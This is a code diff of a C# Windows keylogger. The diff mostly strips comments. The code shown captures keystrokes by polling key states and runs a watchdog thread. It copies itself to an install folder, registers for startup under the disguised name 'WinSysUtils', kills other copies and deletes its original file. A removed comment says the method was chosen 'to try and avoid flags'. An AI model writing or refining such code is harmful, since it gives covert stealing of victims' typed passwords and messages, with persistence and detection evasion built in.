@@ -38,13 +38,11 @@ namespace KeyLogger
 
             EnsureInstalled();
 
-            // Start watchdog if not running
             if (!IsWatchdogRunning())
             {
                 StartWatchdog();
             }
 
-            // Start a thread to keep monitoring the watchdog
             new Thread(() => {
                 while (true)
                 {
@@ -61,10 +59,8 @@ namespace KeyLogger
             {
                 Thread.Sleep(10);
 
-                // An even more advanced check
                 bool shift = false;
                 short shiftState = (short)GetAsyncKeyState(16);
-                // Keys.ShiftKey doesn't work, so using its numeric equivalent
                 if ((shiftState & 0x8000) == 0x8000)
                 {
                     shift = true;
@@ -79,26 +75,20 @@ namespace KeyLogger
 
                     if (isDown && !lastKeyState[i])
                     {
-                        // Key just pressed
                         lastKeyState[i] = true;
 
-                        // Check for Space and Enter
                         if (((Keys)i) == Keys.Space) { buf += " "; }
                         else if (((Keys)i) == Keys.Enter) { buf += "\r\n"; }
-                        // Skip mouse buttons
-                        else if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) { /* ignore */ }
-                        // Skip Shift, Ctrl, Alt, and other modifier keys
-                        else if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital || ((Keys)i) == Keys.NumLock) { /* ignore */ }
-                        else if (((Keys)i) == Keys.LControlKey || ((Keys)i) == Keys.RControlKey) { /* ignore */ }
-                        else if (((Keys)i) == Keys.LMenu || ((Keys)i) == Keys.RMenu) { /* ignore */ }
-                        // Skip other non-essential keys
-                        else if (((Keys)i).ToString().Contains("OemBackslash") || ((Keys)i).ToString().Contains("Scroll")) { /* ignore */ }
-                        else if (((Keys)i) == Keys.Escape || ((Keys)i) == Keys.Tab) { /* ignore */ }
-                        else if (((Keys)i) == Keys.Prior || ((Keys)i) == Keys.Next) { /* ignore */ }
-                        else if (((Keys)i) == Keys.Home || ((Keys)i) == Keys.End) { /* ignore */ }
-                        else if (((Keys)i) == Keys.Up || ((Keys)i) == Keys.Down || ((Keys)i) == Keys.Left || ((Keys)i) == Keys.Right) { /* ignore */ }
-                        else if (((Keys)i) == Keys.LWin || ((Keys)i) == Keys.RWin) { /* ignore */ }
-                        // Handle single character keys
+                        else if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) { }
+                        else if (((Keys)i).ToString().Contains("Shift") || ((Keys)i) == Keys.Capital || ((Keys)i) == Keys.NumLock) { }
+                        else if (((Keys)i) == Keys.LControlKey || ((Keys)i) == Keys.RControlKey) { }
+                        else if (((Keys)i) == Keys.LMenu || ((Keys)i) == Keys.RMenu) { }
+                        else if (((Keys)i).ToString().Contains("OemBackslash") || ((Keys)i).ToString().Contains("Scroll")) { }
+                        else if (((Keys)i) == Keys.Escape || ((Keys)i) == Keys.Tab) { }
+                        else if (((Keys)i) == Keys.Prior || ((Keys)i) == Keys.Next) { }
+                        else if (((Keys)i) == Keys.Home || ((Keys)i) == Keys.End) { }
+                        else if (((Keys)i) == Keys.Up || ((Keys)i) == Keys.Down || ((Keys)i) == Keys.Left || ((Keys)i) == Keys.Right) { }
+                        else if (((Keys)i) == Keys.LWin || ((Keys)i) == Keys.RWin) { }
                         else if (((Keys)i).ToString().Length == 1)
                         {
                             char key = ((Keys)i).ToString()[0];
@@ -117,7 +107,6 @@ namespace KeyLogger
                         }
                         else
                         {
-                            // Wrap non-single-character keys in angle brackets
                             buf += $"<{((Keys)i).ToString()}>";
                         }
 
@@ -129,7 +118,6 @@ namespace KeyLogger
                     }
                     else if (!isDown && lastKeyState[i])
                     {
-                        // Key just released
                         lastKeyState[i] = false;
                     }
                 }
@@ -145,7 +133,6 @@ namespace KeyLogger
             }
             catch (Exception)
             {
-                // Silently ignore errors
             }
         }
 
@@ -163,7 +150,6 @@ namespace KeyLogger
                         Directory.CreateDirectory(installDirectory);
                     }
 
-                    // Kill existing process if it's running from InstallPath to allow overwrite
                     foreach (var process in Process.GetProcesses())
                     {
                         try
@@ -178,29 +164,23 @@ namespace KeyLogger
                                 }
                             }
                         }
-                        catch { /* Ignore processes we can't access */ }
+                        catch { }
                     }
 
                     File.Copy(currentExe, InstallPath, true);
 
-                    // Register for startup
                     using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                     {
                         key.SetValue("WinSysUtils", $"\"{InstallPath}\"");
                     }
 
-                    // Start the installed version
                     Process.Start(InstallPath);
 
-                    // Re-register for startup just in case it was deleted
                     using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                     {
                         key.SetValue("WinSysUtils", $"\"{InstallPath}\"");
                     }
 
-                    // Self-deletion of the original executable
-                    // We'll use a slightly different approach to try and avoid flags
-                    // but still satisfy the user's "move itself" requirement.
                     ProcessStartInfo psi = new ProcessStartInfo
                     {
                         FileName = "cmd.exe",
@@ -214,7 +194,6 @@ namespace KeyLogger
                 }
                 catch (Exception)
                 {
-                    // If installation fails (e.g. permissions), just continue running from current location
                 }
             }
         }
